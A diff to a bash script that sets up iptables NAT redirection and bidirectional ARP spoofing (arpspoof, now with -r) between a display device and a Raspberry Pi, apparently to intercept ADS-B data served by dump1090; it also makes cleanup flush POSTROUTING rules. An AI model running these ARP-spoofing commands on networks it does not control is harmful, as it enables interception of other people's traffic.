@@ -40,8 +40,8 @@ cleanup() {
   # Flush PREROUTING rules in the nat table
   sudo iptables -t nat -F PREROUTING
 
-  # Optionally flush POSTROUTING rules in the nat table
-  # sudo iptables -t nat -F POSTROUTING
+  # Flush POSTROUTING rules in the nat table
+  sudo iptables -t nat -F POSTROUTING
 
   # Kill all background processes started by this script
   kill -TERM $(pgrep -P $$) 2>/dev/null || true
@@ -73,8 +73,8 @@ iptables -t nat -A POSTROUTING -o "$INTERFACE" -p tcp --sport "$PORT_DUMP" \
 # 6. Launch long-running tools in the background
 ###############################################################################
 # Start ARP spoofing between DISPLAY_ADDRESS and PI_ADDRESS
-arpspoof -i "$INTERFACE" -t "$DISPLAY_ADDRESS" "$PI_ADDRESS" &
-arpspoof -i "$INTERFACE" -t "$PI_ADDRESS"   "$DISPLAY_ADDRESS" &
+arpspoof -i "$INTERFACE" -t "$DISPLAY_ADDRESS" "$PI_ADDRESS" -r &
+arpspoof -i "$INTERFACE" -t "$PI_ADDRESS"   "$DISPLAY_ADDRESS" -r &
 
 # Start dump1090 in interactive net-only mode
 $DUMP1090_PATH/dump1090 --interactive --net-only &
